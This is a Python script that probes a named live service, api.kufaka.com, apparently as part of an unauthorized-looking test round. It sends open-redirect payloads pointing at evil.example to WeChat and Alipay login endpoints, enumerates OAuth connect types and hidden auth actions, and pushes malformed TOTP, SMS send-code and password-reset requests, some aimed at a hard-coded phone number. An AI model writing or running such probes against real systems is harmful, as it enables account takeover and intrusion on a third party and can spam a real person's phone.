#!/usr/bin/env python3
# i3214 round2: confirm disabled state of third-party login, enumerate connect types / extra actions
import json, urllib.request, urllib.error, urllib.parse, http.cookiejar

BASE = "https://api.kufaka.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

def mkop():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar)), jar

def req(op, path, method="GET", body=None, extra=None, timeout=22):
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
         "Accept-Language": "zh-CN,zh;q=0.9", "Origin": BASE,
         "Referer": BASE + "/user/", "X-Requested-With": "XMLHttpRequest"}
    if extra: h.update(extra)
    data = None
    if body is not None:
        if isinstance(body, dict):
            data = urllib.parse.urlencode(body).encode()
            h["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            data = body.encode(); h.setdefault("Content-Type", "application/json")
    rq = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        r = op.open(rq, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore"), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore"), e.headers
    except Exception as e:
        return 0, "ERR " + str(e)[:120], {}

def show(tag, method, path, st, b, hdrs):
    loc = hdrs.get("Location")
    print("%-26s %-4s %-52s -> %s | %s%s" % (
        tag, method, path, st, " ".join(b.split())[:260],
        (" [LOC:%s]" % loc[:80]) if loc else ""), flush=True)

def main():
    op, jar = mkop()
    print("== A. wxLogin/alipayLogin GET param variants (full) ==", flush=True)
    variants = [
        "/user/auth/wxLogin",
        "/user/auth/wxLogin?url=https://evil.example/",
        "/user/auth/wxLogin?redirect_uri=https://evil.example/cb",
        "/user/auth/wxLogin?callback=https://evil.example/cb",
        "/user/auth/wxLogin?type=wx",
        "/user/auth/wxLogin?state=abc",
        "/user/auth/wxLogin?code=abc&state=abc",
        "/user/auth/wxLogin?from=pc",
        "/user/auth/wxLogin?scope=snsapi_userinfo&state=x",
        "/user/auth/wxLogin?redirect=%2Fuser%2F",
        "/user/auth/alipayLogin?url=https://evil.example/",
        "/user/auth/alipayLogin?redirect_uri=https://evil.example/cb",
        "/user/auth/alipayLogin?callback=https://evil.example/cb",
        "/user/auth/alipayLogin?auth_code=abc&state=x",
        "/user/auth/alipayLogin?code=abc&state=abc",
        "/user/auth/alipayLogin?type=alipay",
    ]
    for p in variants:
        st, b, h = req(op, p, "GET"); show("A", "GET", p, st, b, h)

    print("\n== B. connect type enumeration ==", flush=True)
    types = ["wx","wechat","weixin","wechatapp","qq","alipay","ali","zhifubao","douyin","tiktok",
             "weibo","github","google","telegram","tg","facebook","apple","email","mobile","phone",
             "sms","user","account","dingtalk","feishu","1","Wx","WX"]
    for t in types:
        st, b, h = req(op, "/user/auth/connect", "POST", {"type": t})
        show("B", "POST", "/user/auth/connect type=%s" % t, st, b, h)

    print("\n== C. extra third-party action enum ==", flush=True)
    extra_acts = ["wxLoginUrl","getWxCode","wxAuth","wxCallback","wxCode","bindWx","wxBind","bindwx",
                  "alipayAuth","alipayCallback","bindAlipay","alipayBind","qqLogin","qqCallback",
                  "weibo","douyin","getAuthUrl","authUrl","oauthUrl","authorize","thirdLogin","third",
                  "bind","callback","authCallback","loginCallback","wxScan","scanLogin","pcLogin",
                  "miniLogin","wxBindCallback","unbindWx","getBind","myBind","thirdBind","bindList","connectList"]
    for a in extra_acts:
        p = "/user/auth/" + a
        st, b, h = req(op, p, "GET"); show("C-G", "GET", p, st, b, h)
        st, b, h = req(op, p, "POST", {}); show("C-P", "POST", p, st, b, h)

    print("\n== D. totp / sendcode / findpwd deeper (auth-gate order) ==", flush=True)
    deep = [
        ("/user/auth/totp", "POST", {"code": ["000000"]}),
        ("/user/auth/totp", "POST", {"code": "0"}),
        ("/user/auth/totp", "POST", {"code": "000000", "enc": 0}),
        ("/user/auth/sendcode", "POST", {"user": "ceshi"}),
        ("/user/auth/sendcode", "POST", {"type": "findpwd", "user": "ceshi"}),
        ("/user/auth/sendcode", "POST", {"phone": "19022075515", "type": "findpwd"}),
        ("/user/auth/sendcode", "POST", {"mobile": "19022075515"}),
        ("/user/auth/sendcode", "POST", {"type": "1"}),
        ("/user/auth/findpwd", "POST", {"user": "ceshi"}),
        ("/user/auth/findpwd", "POST", {"user": "ceshi", "type": "mobile"}),
        ("/user/auth/login", "POST", {"user": "ceshi", "pass": "x", "enc": 0}),
    ]
    for path, m, body in deep:
        st, b, h = req(op, path, m, body)
        show("D", m, path + " " + json.dumps(body, ensure_ascii=False), st, b, h)

    print("\n== E. raw body of one wxLogin (full json) ==", flush=True)
    st, b, h = req(op, "/user/auth/wxLogin", "GET")
    print("BODY:", b[:800], flush=True)
    print("HDRS:", {k: v for k, v in h.items() if k.lower() not in ("set-cookie",)}, flush=True)

main()
